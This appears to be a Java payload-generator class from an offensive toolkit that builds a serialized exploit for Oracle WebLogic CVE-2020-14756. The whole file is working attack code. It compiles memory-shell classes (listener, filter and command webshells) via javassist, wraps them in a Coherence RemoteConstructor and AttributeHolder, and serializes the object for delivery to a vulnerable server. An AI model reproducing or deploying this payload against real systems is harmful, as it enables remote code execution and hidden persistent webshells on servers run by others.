package core.payloads;

import com.tangosol.coherence.servlet.AttributeHolder;
import com.tangosol.internal.util.invoke.ClassDefinition;
import com.tangosol.internal.util.invoke.ClassIdentity;
import com.tangosol.internal.util.invoke.RemoteConstructor;
import core.enumtypes.PayloadType;
import core.memshell.CommandMemShell;
import core.memshell.WeblogicFilterMemShell_CVE_2020_14756;
import core.memshell.WeblogicListenerMemShell_CVE_2020_14756;

import core.utils.Util;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;

import java.lang.reflect.Method;

public class Weblogic_CVE_2020_14756 {
    public static Object getObject(PayloadType type, String trojanType) throws Exception {
        ClassIdentity classIdentity = null;
        CtClass ctClass = null;
        ClassPool cp = ClassPool.getDefault();
        ClassClassPath classPath = new ClassClassPath(Weblogic_CVE_2020_14756.class);
        cp.insertClassPath(classPath);
        switch (type){
            case weblogiclistenermemshell:
                classIdentity = new ClassIdentity(WeblogicListenerMemShell_CVE_2020_14756.class);
                ctClass = cp.get(WeblogicListenerMemShell_CVE_2020_14756.class.getName());
                ctClass.replaceClassName(WeblogicListenerMemShell_CVE_2020_14756.class.getName(), WeblogicListenerMemShell_CVE_2020_14756.class.getName() + "$" + classIdentity.getVersion());
                break;
            case weblogicfiltermemshell:
                classIdentity = new ClassIdentity(WeblogicFilterMemShell_CVE_2020_14756.class);
                ctClass = cp.get(WeblogicFilterMemShell_CVE_2020_14756.class.getName());
                ctClass.replaceClassName(WeblogicFilterMemShell_CVE_2020_14756.class.getName(), WeblogicFilterMemShell_CVE_2020_14756.class.getName() + "$" + classIdentity.getVersion());
                break;
            case commandmemshell:
                classIdentity = new ClassIdentity(CommandMemShell.class);
                ctClass = cp.get(CommandMemShell.class.getName());
                ctClass.replaceClassName(CommandMemShell.class.getName(), CommandMemShell.class.getName() + "$" + classIdentity.getVersion());
                break;
        }

        RemoteConstructor constructor = new RemoteConstructor(
                new ClassDefinition(classIdentity, ctClass.toBytecode()),
                new Object[]{}
        );
        ctClass.defrost();
        AttributeHolder attributeHolder = new AttributeHolder();
        Method setInternalValue = attributeHolder.getClass().getDeclaredMethod("setInternalValue", Object.class);
        setInternalValue.setAccessible(true);
        setInternalValue.invoke(attributeHolder, constructor);

        return attributeHolder;
    }

    public static byte[] getByte(PayloadType type, String trojanType) throws Exception {
        Object attributeHolder = getObject(type, trojanType);
        return Util.serialize(attributeHolder);
    }
}
